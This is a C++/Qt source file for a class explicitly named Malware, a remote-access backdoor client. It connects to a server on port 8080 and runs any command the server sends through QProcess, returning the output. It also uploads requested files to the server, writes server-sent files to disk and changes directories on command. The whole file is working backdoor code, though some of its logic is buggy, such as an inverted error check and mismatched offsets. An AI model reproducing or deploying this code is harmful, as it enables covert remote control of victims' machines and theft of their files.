#include "malware.h"
#include <QtDebug>
#include <QByteArray>
#include <QHostAddress>
#include <QStyle>
#include <QtNetwork>
#include <QProcess>

Malware::Malware()
{
    ConnectToServer();
//    QTimer *try_to_connect = new QTimer();
   // connect(try_to_connect, &QTimer::timeout, this, &Malware::ConnectToServer);
   // try_to_connect->start(3000);
}

void Malware::ConnectToServer()
{
 // if(connection_state)
    //{
        qDebug() << "try to connecting";
        client_Socket = new QTcpSocket();
        QString serverIP;

        QList<QHostAddress> ipAddressesList = QNetworkInterface::allAddresses();

        for (const QHostAddress &address : ipAddressesList) {
            if (address != QHostAddress::LocalHost && address != QHostAddress::LocalHostIPv6 &&
                address.protocol() == QAbstractSocket::IPv4Protocol)
            {
                serverIP = address.toString();
                break;
            }
        }
            client_Socket->connectToHost(serverIP, 8080);
            client_Socket->waitForConnected();
            //if(client_Socket->state() == QTcpSocket::ConnectedState)
            //    connection_state = 0;

            connect(client_Socket, SIGNAL(readyRead()), this, SLOT(Read_Data()));
   // }
    qDebug() << "connected.";
    file_is_coming = false;
}

void Malware::Write_Data(QString out)
{
    qDebug() << "Write data : " + out;

    if (!out.isEmpty())
    {
        QByteArray requestData = out.toUtf8();
            client_Socket->write(requestData);
            client_Socket->waitForBytesWritten();
    }
}

void Malware::Read_Data()
{
    if(file_is_coming == true)
    {
        qDebug() << "read the file that server send.";
        read_file();
        file_is_coming = false;
        return;
    }
    QByteArray data = client_Socket->readAll();


    if(data.contains("=file_is_coming>") )
    {
        dir = data.mid(16);
        qDebug() <<"dir to save or send is1 : " + dir;
        file_is_coming = true;
        return;
    }
    else if(data.contains("=downloading_file>") )
    {
        dir = data.mid(18);
        qDebug() <<"dir to save or send is2 : " + dir;
        send_file(dir);
        downloading_file = false;
        return;
    }
    else if(data.contains("=change_dir>"))
    {
        QString path = data.remove(0,15);
        qDebug() << "change dir to : " + path;

        if(d.cd(path))
            Write_Data("current dir : " + d.path());
        else{
            Write_Data("dir is not exist !");
        }
        return;
    }
    else
    {
        qDebug() << "Read data : " + data;
        procces_the_command(data);
    }
}

void Malware::procces_the_command(QString command)
{
    QProcess proc;
    proc.start(command);
    proc.waitForFinished();
    if(proc.error())
    {
        QString output = proc.readAllStandardOutput();
        Write_Data(output);
    }
    else
    {
        Write_Data(proc.errorString());
    }
}

void Malware::read_file()
{
    QByteArray Databuffer;

    QDataStream stream(client_Socket);
    stream.setVersion(QDataStream::Qt_DefaultCompiledVersion);

    stream.startTransaction();
    stream >> Databuffer;

    QString header = Databuffer.mid(0, 128);
    qDebug() <<"header of file is : " + header;
    QString filename = header.split(",")[0].split(":")[1];
    //QString file_ext = filename.split(".")[1];
    //QString filesize = header.split(",")[1].split(":")[1];

    Databuffer = Databuffer.mid(128);

    QFile file(dir + "/" + filename);
    if(file.open(QIODevice::WriteOnly))
    {
        file.write(Databuffer);
        file.close();
    }
    else
    {
        qDebug() << "can't creating the file";
    }
}

void Malware::send_file(QString filePath)
{
    qDebug() << "sending file to server";
    client_Socket->write(("=file_is_coming>"));
    client_Socket->waitForBytesWritten();
    QFile filedata(filePath);
    if (filedata.open(QIODevice::ReadOnly))
    {
        QFileInfo fileinfo(filedata);
        qDebug() << "file name to sending : " + fileinfo.fileName();
        QString filename_ext(fileinfo.fileName());
        QDataStream stream(client_Socket);
        stream.setVersion(QDataStream::Qt_DefaultCompiledVersion);

        QByteArray header;
        header.prepend("filename:" + filename_ext.toUtf8() + ",filesize:" + QString::number(filedata.size()).toUtf8() );
        header.resize(128);
        qDebug() << "header data is :" + header;

        QByteArray bytedata = filedata.readAll();
        bytedata.prepend(header);

        stream << bytedata;
        return;
    }
    else
    {
        qDebug() << "can't open the file.";
    }

    QByteArray data = filedata.readAll();
    client_Socket->write(data);

    filedata.close();
    qDebug() << "File sent successfully!";
}
